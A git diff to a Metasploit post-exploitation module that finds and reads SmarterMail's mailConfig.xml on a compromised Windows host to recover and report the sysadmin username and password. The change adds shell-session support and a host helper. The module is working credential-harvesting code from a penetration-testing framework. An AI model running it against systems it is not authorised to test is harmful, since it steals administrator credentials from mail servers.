@@ -25,20 +25,33 @@ class Metasploit3 < Msf::Post
       },
       'License'       => MSF_LICENSE,
       'Author'        => [
-        'Joe Giron',                          # Discovery and PoC (@theonlyevil1)
-        'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        'Joe Giron',                           # Discovery and PoC (@theonlyevil1)
+        'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
+        'sinn3r'                               # shell session support
       ],
       'References'    =>
         [
           ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
         ],
       'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter']
+      'SessionTypes'  => ['meterpreter', 'shell']
     ))
   end
 
+  def r_host
+    if session.type =~ /meterpreter/
+      session.sock.peerhost
+    else
+      session.session_host
+    end
+  end
+
   def peer
-    "#{session.sock.peerhost} (#{sysinfo['Computer']})"
+    if session.type =~ /meterpreter/
+      "#{r_host} (#{sysinfo['Computer']})"
+    else
+      r_host
+    end
   end
 
   #
@@ -58,10 +71,10 @@ class Metasploit3 < Msf::Post
   #
   def get_mail_config_path
     found_path = ''
-    drive = session.fs.file.expand_path('%SystemDrive%')
+    drive = expand_path('%SystemDrive%').strip
 
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = "#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml"
+      path = %Q|#{drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml|.strip
       vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
       if file?(path)
         found_path = path
@@ -81,7 +94,7 @@ class Metasploit3 < Msf::Post
 
     vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
-      data = read_file("#{path}")
+      data = read_file(path)
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
       return result
@@ -122,7 +135,7 @@ class Metasploit3 < Msf::Post
     pass = result['password']
     print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
     report_auth_info(
-      :host  => session.sock.peerhost,
+      :host  => r_host,
       :sname => 'http',
       :user  => user,
       :pass  => pass,
